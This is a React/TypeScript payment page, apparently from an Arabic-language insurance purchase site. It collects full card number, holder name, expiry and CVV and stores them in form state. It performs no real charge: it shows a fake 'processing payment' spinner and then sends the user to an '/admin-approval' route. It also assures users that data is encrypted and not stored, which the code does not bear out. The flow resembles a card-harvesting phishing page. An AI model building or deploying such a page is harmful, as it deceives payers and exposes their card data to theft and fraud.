import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { useForm } from '../FormContext'
import StepIndicator from '../components/StepIndicator'
import type { PaymentData } from '../types'

export default function Payment() {
  const navigate = useNavigate()
  const { data, setPayment } = useForm()

  const [form, setForm] = useState<PaymentData>({
    cardNumber: '',
    cardHolder: '',
    expiry: '',
    cvv: '',
    method: 'mada',
  })

  const [errors, setErrors] = useState<Record<string, string>>({})
  const [processing, setProcessing] = useState(false)

  useEffect(() => {
    if (!data.selectedOffer) {
      navigate('/offers')
    }
  }, [])

  const formatCardNumber = (value: string) => {
    return value.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
  }

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 4)
    if (digits.length >= 3) return `${digits.slice(0, 2)}/${digits.slice(2)}`
    return digits
  }

  const validate = (): boolean => {
    const e: Record<string, string> = {}
    if (form.cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = 'رقم البطاقة يجب أن يكون 16 رقماً'
    if (!form.cardHolder.trim()) e.cardHolder = 'يرجى إدخال اسم حامل البطاقة'
    if (!/^\d{2}\/\d{2}$/.test(form.expiry)) e.expiry = 'تاريخ الانتهاء غير صحيح (MM/YY)'
    if (!/^\d{3}$/.test(form.cvv)) e.cvv = 'رمز التحقق يجب أن يكون 3 أرقام'
    setErrors(e)
    return Object.keys(e).length === 0
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validate()) return
    setProcessing(true)
    setPayment(form)
    setTimeout(() => {
      navigate('/admin-approval')
    }, 2500)
  }

  if (processing) {
    return (
      <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8">
        <StepIndicator currentStep={5} />
        <div className="card flex flex-col items-center justify-center py-20">
          <div className="w-12 h-12 border-4 border-primary-200 border-t-primary-600 rounded-full animate-spin mb-4" />
          <p className="text-neutral-500 font-bold mb-2">جاري معالجة الدفع...</p>
          <p className="text-neutral-400 text-sm">يرجى عدم إغلاق الصفحة</p>
        </div>
      </div>
    )
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 py-8 animate-fade-in">
      <h1 className="text-2xl font-extrabold text-center text-neutral-800 mb-2">معلومات الدفع</h1>
      <p className="text-center text-neutral-500 mb-6">أدخل بيانات بطاقتك لإكمال عملية الشراء</p>
      <StepIndicator currentStep={5} />

      {/* Order Summary */}
      {data.selectedOffer && (
        <div className="card mb-4 bg-primary-50 border-primary-100">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-sm text-neutral-500">شركة التأمين</p>
              <p className="font-bold text-neutral-800">{data.selectedOffer.companyName}</p>
            </div>
            <div className="text-left">
              <p className="text-sm text-neutral-500">الإجمالي</p>
              <p className="font-extrabold text-primary-700 text-xl">
                {data.selectedOffer.finalPrice.toLocaleString()} ريال
              </p>
            </div>
          </div>
        </div>
      )}

      <form onSubmit={handleSubmit} className="card space-y-5">
        {/* Payment Method */}
        <div>
          <label className="label-field">طريقة الدفع</label>
          <div className="grid grid-cols-3 gap-3">
            {([
              { id: 'mada', label: 'مدى', icon: '💳' },
              { id: 'visa', label: 'Visa', icon: '💳' },
              { id: 'mastercard', label: 'Mastercard', icon: '💳' },
            ] as const).map(m => (
              <button
                key={m.id}
                type="button"
                onClick={() => setForm({ ...form, method: m.id })}
                className={`py-3 rounded-xl font-bold border-2 transition-all duration-200 flex flex-col items-center gap-1 ${
                  form.method === m.id
                    ? 'border-primary-600 bg-primary-50 text-primary-700'
                    : 'border-neutral-200 bg-white text-neutral-500 hover:border-neutral-300'
                }`}
              >
                <span className="text-2xl">{m.icon}</span>
                <span className="text-xs">{m.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Card Number */}
        <div>
          <label className="label-field">رقم البطاقة</label>
          <input
            type="text"
            inputMode="numeric"
            className="input-field"
            placeholder="0000 0000 0000 0000"
            value={form.cardNumber}
            onChange={e => setForm({ ...form, cardNumber: formatCardNumber(e.target.value) })}
            dir="ltr"
          />
          {errors.cardNumber && <p className="text-red-500 text-xs mt-1 font-bold">{errors.cardNumber}</p>}
        </div>

        {/* Card Holder */}
        <div>
          <label className="label-field">اسم حامل البطاقة</label>
          <input
            type="text"
            className="input-field"
            placeholder="CARD HOLDER NAME"
            value={form.cardHolder}
            onChange={e => setForm({ ...form, cardHolder: e.target.value.toUpperCase() })}
            dir="ltr"
          />
          {errors.cardHolder && <p className="text-red-500 text-xs mt-1 font-bold">{errors.cardHolder}</p>}
        </div>

        {/* Expiry & CVV */}
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="label-field">تاريخ الانتهاء</label>
            <input
              type="text"
              inputMode="numeric"
              className="input-field"
              placeholder="MM/YY"
              value={form.expiry}
              onChange={e => setForm({ ...form, expiry: formatExpiry(e.target.value) })}
              dir="ltr"
            />
            {errors.expiry && <p className="text-red-500 text-xs mt-1 font-bold">{errors.expiry}</p>}
          </div>
          <div>
            <label className="label-field">رمز التحقق (CVV)</label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={3}
              className="input-field"
              placeholder="000"
              value={form.cvv}
              onChange={e => setForm({ ...form, cvv: e.target.value.replace(/\D/g, '') })}
              dir="ltr"
            />
            {errors.cvv && <p className="text-red-500 text-xs mt-1 font-bold">{errors.cvv}</p>}
          </div>
        </div>

        {/* Security note */}
        <div className="flex items-center gap-2 text-xs text-neutral-400 bg-neutral-50 rounded-xl p-3">
          <span className="text-base">🔒</span>
          <span>جميع المعاملات مشفرة وآمنة. لا نقوم بتخزين بيانات بطاقتك.</span>
        </div>

        <div className="flex gap-3">
          <button
            type="button"
            onClick={() => navigate('/offer-details')}
            className="btn-secondary flex-1"
          >
            السابق
          </button>
          <button type="submit" className="btn-primary flex-1 text-lg">
            دفع {data.selectedOffer?.finalPrice.toLocaleString()} ريال
          </button>
        </div>
      </form>
    </div>
  )
}
